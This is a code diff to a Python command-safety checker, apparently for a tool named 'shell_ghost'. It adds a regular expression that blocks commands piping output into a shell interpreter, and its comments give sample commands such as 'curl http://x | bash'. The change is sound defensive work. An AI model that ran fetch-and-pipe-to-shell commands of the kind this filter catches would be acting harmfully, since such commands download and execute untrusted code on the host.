@@ -8,10 +8,18 @@ import shlex
 import logging
 import json
 import os
+import re
 from datetime import datetime
 from pathlib import Path
 
 logger = logging.getLogger("shell_ghost")
+
+# Matches piping or redirecting into a shell interpreter, e.g.
+#   "curl http://x | bash", "wget ... |sh", "... | zsh".
+# The literal DANGEROUS_PATTERNS entries only catch the exact "curl | bash"
+# spacing; real-world commands include a URL in between, so this regex closes
+# that gap regardless of surrounding text or whitespace.
+_PIPE_TO_SHELL = re.compile(r"\|\s*(?:bash|sh|zsh|dash|ksh|fish)\b")
 
 # ── Whitelists & Blacklists ────────────────────────────────────────────────
 
@@ -69,6 +77,11 @@ def is_safe(cmd: str) -> tuple[bool, str]:
     for pattern in DANGEROUS_PATTERNS:
         if pattern in cmd_lower:
             return False, f"Blocked pattern detected: `{pattern}`"
+
+    # Block piping/redirecting into a shell interpreter regardless of the
+    # text in between (e.g. "curl http://x | bash").
+    if _PIPE_TO_SHELL.search(cmd_lower):
+        return False, "Blocked: piping into a shell interpreter"
 
     # Extract base command
     try:
